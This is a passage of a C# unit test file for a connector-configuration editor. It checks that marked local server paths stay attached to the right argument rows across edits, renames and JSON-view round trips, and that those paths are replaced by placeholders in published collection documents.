        dbt.RequestView(EditView.Form);
        Assert.Equal(EditView.Form, dbt.View);
        // The placeholder field stays live, so the value can still be filled.
        Assert.True(dbt.AsksFor(EnvRow(dbt, "DBT_TOKEN")));
        Assert.False(dbt.AsksFor(EnvRow(dbt, "DBT_REGION")));

        using var ledger = rig.Editor("ledger", "Data team");
        ledger.RequestView(EditView.Json);
        ledger.RequestView(EditView.Form);
        Assert.True(ledger.AsksForArg(0));

        // Carried, not retaken: a value filled before the trip keeps its field live.
        EnvRow(dbt, "DBT_TOKEN").Value = "secret_abc";
        dbt.RequestView(EditView.Json);
        dbt.RequestView(EditView.Form);
        Assert.True(dbt.AsksFor(EnvRow(dbt, "DBT_TOKEN")));

        // The auth flags are not row-keyed, so a round trip has nothing to carry for them.
        using var notion = rig.Editor("notion", "Data team");
        notion.RequestView(EditView.Json);
        notion.RequestView(EditView.Form);
        Assert.True(notion.AsksForBearerToken);
    }

    [Fact]
    public void AJsonRoundTripKeepsAPublishedArgumentsHint()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        Assert.Null(state.CreateCollection("Team"));
        Assert.Null(state.Upsert("svc", new McpEntry(JsonValue.Object(
            ("command", JsonValue.String("node")),
            ("args", JsonValue.Array([JsonValue.String("/Users/d/server.js")])))), null, "Team"));
        var intent = new PublishIntent(
            [],
            [new("svc", new Dictionary<JsonPointer, PublishIntent.PathMark>
            {
                [new JsonPointer(["args", "0"])] = new("server_path", "your clone", "/Users/d/server.js"),
            })],
            []);
        rig.H.Publish(state, "Team", intent, "share");

        using var editor = rig.Editor("svc", "Team");
        Assert.Equal("your clone", editor.PublishedHintForArg(0));
        editor.RequestView(EditView.Json);
        editor.RequestView(EditView.Form);
        // The hint survives an unchanged round trip.
        Assert.Equal("your clone", editor.PublishedHintForArg(0));
    }

    // MARK: saving a published connector moves its path marks with their rows

    private const string ServerPath = "/Users/d/server.js";

    private static JsonPointer ArgPointer(int index) =>
        new(["args", index.ToString(System.Globalization.CultureInfo.InvariantCulture)]);

    private static Dictionary<JsonPointer, PublishIntent.PathMark> MarkAt(int index, string value) =>
        new() { [ArgPointer(index)] = new("server_path", "your clone", value) };

    /// <summary>
    /// "Team" publishing <c>svc</c>, whose arguments are <paramref name="args"/> with the server
    /// path marked the way the Publish dialog records it. Returns the document's path.
    /// </summary>
    private static string PublishTeam(EditorRig rig, params string[] args)
    {
        var state = rig.State;
        Assert.Null(state.CreateCollection("Team"));
        Assert.Null(state.Upsert("svc", new McpEntry(rig.Local("node", args)), null, "Team"));
        return rig.H.Publish(state, "Team", new PublishIntent(
            [], [new("svc", MarkAt(Array.IndexOf(args, ServerPath), ServerPath))], []), "share");
    }

    private static IReadOnlyDictionary<JsonPointer, PublishIntent.PathMark>? Marks(
        EditorRig rig, string connector = "svc", string collection = "Team") =>
        rig.State.CollectionsFile.Collections.GetValueOrDefault(collection)?.Publish?.Intent.PathMarks
            .GetValueOrDefault(connector);

    private static void AssertMarks(IReadOnlyDictionary<JsonPointer, PublishIntent.PathMark> expected,
                                    IReadOnlyDictionary<JsonPointer, PublishIntent.PathMark>? actual)
    {
        Assert.NotNull(actual);
        Assert.Equal(expected.Count, actual.Count);
        foreach (var (pointer, mark) in expected)
        {
            Assert.Equal(mark, actual.GetValueOrDefault(pointer));
        }
    }

    private static IReadOnlyList<string> PublishedArgs(string file, string connector = "svc") =>
        Assert.IsType<CollectionDocument.Launcher.Local>(
            CollectionDocument.Decode(File.ReadAllBytes(file)).Connectors[connector].Launcher).Args;

    [Fact]
    public void SavingMovesAPathMarkWithItsRow()
    {
        using var rig = new EditorRig();
        var file = PublishTeam(rig, ServerPath, "--quiet");

        using (var editor = rig.Editor("svc", "Team"))
        {
            editor.Args.Insert(0, new ArgRow("--inspect"));
            Assert.True(editor.Save());
        }
        AssertMarks(MarkAt(1, ServerPath), Marks(rig));   // an argument inserted above
        // The neighbour that slid into the old position travels as written, the path does not.
        Assert.Equal(["--inspect", "${CC_NEEDS:server_path}", "--quiet"], PublishedArgs(file));

        using (var editor = rig.Editor("svc", "Team"))
        {
            editor.Args.RemoveAt(0);
            Assert.True(editor.Save());
        }
        AssertMarks(MarkAt(0, ServerPath), Marks(rig));   // one removed above

        using (var editor = rig.Editor("svc", "Team"))
        {
            editor.Args.Move(0, 1);
            Assert.True(editor.Save());
        }
        AssertMarks(MarkAt(1, ServerPath), Marks(rig));   // reordered
        Assert.Equal(["--quiet", "${CC_NEEDS:server_path}"], PublishedArgs(file));
        Assert.Null(rig.State.PublishError);
        Assert.False(JsonText.FileContains(file, ServerPath));
    }

    [Fact]
    public void EditingTheMarkedPathInPlaceKeepsItMarked()
    {
        using var rig = new EditorRig();
        var file = PublishTeam(rig, ServerPath);
        using var editor = rig.Editor("svc", "Team");
        const string corrected = "/Users/d/v2/server.js";
        editor.Args[0].Value = corrected;
        Assert.True(editor.Save());
        // Still the marked row; the record learns its new text.
        AssertMarks(MarkAt(0, corrected), Marks(rig));
        Assert.Equal(["${CC_NEEDS:server_path}"], PublishedArgs(file));
        Assert.Null(rig.State.PublishError);
        Assert.False(JsonText.FileContains(file, corrected));
    }

    [Fact]
    public void DeletingTheMarkedRowDropsItsMark()
    {
        using var rig = new EditorRig();
        var file = PublishTeam(rig, "--quiet", ServerPath);
        using var editor = rig.Editor("svc", "Team");
        editor.Args.RemoveAt(1);
        Assert.True(editor.Save());
        Assert.Null(Marks(rig));   // nothing is left for it to mark
        Assert.Null(rig.State.PublishError);
        Assert.Equal(["--quiet"], PublishedArgs(file));
    }

    [Fact]
    public void DeletingTheMarkedRowAndTypingThePathBackKeepsItMarked()
    {
        using var rig = new EditorRig();
        var file = PublishTeam(rig, ServerPath, "--quiet");
        using (var editor = rig.Editor("svc", "Team"))
        {
            editor.Args.RemoveAt(0);
            editor.Args.Add(new ArgRow(ServerPath));
            Assert.True(editor.Save());
        }
        Assert.Null(rig.State.PublishError);
        // The same path typed back is still the marked path.
        Assert.Equal(["--quiet", "${CC_NEEDS:server_path}"], PublishedArgs(file));
        Assert.False(JsonText.FileContains(file, ServerPath));
        // Left for publishing to place by value.
        AssertMarks(MarkAt(0, ServerPath), Marks(rig));
    }

    [Fact]
    public void MovingTheMarkedPathIntoTheCommandKeepsItBack()
    {
        using var rig = new EditorRig();
        var file = PublishTeam(rig, ServerPath, "--quiet");
        var before = File.ReadAllBytes(file);
        using (var editor = rig.Editor("svc", "Team"))
        {
            editor.Command = ServerPath;
            editor.Args.RemoveAt(0);
            Assert.True(editor.Save());
        }
        // The path is still in the save, so the mark stays.
        AssertMarks(MarkAt(0, ServerPath), Marks(rig));
        Assert.Equal(AppState.PathMarkMovedError("svc"), rig.State.PublishError?.Message);
        Assert.Equal(PublishErrorKind.BlockedForReview, rig.State.PublishError?.Kind);
        Assert.Equal(before, File.ReadAllBytes(file));
        Assert.False(JsonText.FileContains(file, ServerPath));
    }

    [Fact]
    public void ACopyOfTheMarkedPathWaitsUntilTheSheetTicksBoth()
    {
        using var rig = new EditorRig();
        var file = PublishTeam(rig, ServerPath, "--quiet");
        var before = File.ReadAllBytes(file);
        using (var editor = rig.Editor("svc", "Team"))
        {
            editor.Args.Add(new ArgRow(ServerPath));
            Assert.True(editor.Save());
        }
        Assert.Equal(AppState.KeptPathCarriedError("svc", FieldName.Argument(3)), rig.State.PublishError?.Message);
        // The copy is not sent as written.
        Assert.Equal(before, File.ReadAllBytes(file));

        // Publish… ticks every row holding the marked path, under the mark's name and hint.
        var dialog = new PublishModel(rig.State, "Team");
        var copies = dialog.PathRows.Where(r => r.Connector == "svc" && r.Value == ServerPath).ToList();
        Assert.Equal([true, true], copies.Select(r => r.Marked));
        Assert.Equal(["server_path", "server_path"], copies.Select(r => r.Name));
        Assert.Equal(["your clone", "your clone"], copies.Select(r => r.Hint));
        Assert.Null(dialog.Publish());
        Assert.Null(rig.State.PublishError);
        Assert.Equal(["${CC_NEEDS:server_path}", "--quiet", "${CC_NEEDS:server_path}"], PublishedArgs(file));
        Assert.False(JsonText.FileContains(file, ServerPath));
    }

    [Fact]
    public void ARenameCarriesTheMarksToTheNewName()
    {
        using var rig = new EditorRig();
        var file = PublishTeam(rig, ServerPath);
        using var editor = rig.Editor("svc", "Team");
        editor.Name = "server";
        editor.Args.Insert(0, new ArgRow("--quiet"));
        Assert.True(editor.Save());
        Assert.Null(Marks(rig));
        AssertMarks(MarkAt(1, ServerPath), Marks(rig, "server"));
        Assert.Equal(["--quiet", "${CC_NEEDS:server_path}"], PublishedArgs(file, "server"));
        Assert.Null(rig.State.PublishError);
    }

    [Fact]
    public void AJsonEditLeavesTheMarksToBePlacedByTheirValue()
    {
        using var rig = new EditorRig();
        var file = PublishTeam(rig, ServerPath, "--quiet");

        // Reordered in the JSON view: the rows come back matched by position, which is a guess, so
        // the record is left as it is and publishing finds the path by what it says.
        using (var editor = rig.Editor("svc", "Team"))
        {
            editor.RequestView(EditView.Json);
            editor.JsonText = rig.Local("node", ["--quiet", ServerPath]).EditorText();
            editor.RequestView(EditView.Form);
            Assert.Equal(EditView.Form, editor.View);
            Assert.True(editor.Save());
        }
        AssertMarks(MarkAt(0, ServerPath), Marks(rig));   // not re-keyed on a guess
        Assert.Equal(["--quiet", "${CC_NEEDS:server_path}"], PublishedArgs(file));

        // Changed in the JSON view and saved from there: nothing says which argument is the marked
        // one now, so no document is written until the author marks it again.
        var before = File.ReadAllBytes(file);
        using (var again = rig.Editor("svc", "Team"))
        {
            again.RequestView(EditView.Json);
            again.JsonText = rig.Local("node", ["--quiet", "/Users/d/v2/server.js"]).EditorText();
            Assert.True(again.Save());
        }
        Assert.Equal(AppState.PathMarkMovedError("svc"), rig.State.PublishError?.Message);
        Assert.Equal(before, File.ReadAllBytes(file));
    }

    [Fact]
    public void PropagateMovesATwinsMarksToo()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        PublishTeam(rig, ServerPath);
        Assert.Null(state.CreateCollection("Mirror"));   // a copy of Team, and now active
        rig.H.Publish(state, "Mirror", new PublishIntent(
            [], [new("svc", MarkAt(0, ServerPath))], []), "share2");

        using var editor = rig.Editor("svc", "Team");
        Assert.Equal(["Mirror"], editor.PropagateTargets);
        editor.Propagate = true;
        editor.Args.Insert(0, new ArgRow("--quiet"));
        Assert.True(editor.Save());
        AssertMarks(MarkAt(1, ServerPath), Marks(rig));
        // The twin held the same arguments, so its marks follow the same rows.
        AssertMarks(MarkAt(1, ServerPath), Marks(rig, collection: "Mirror"));
        Assert.Null(state.PublishError);
    }
}
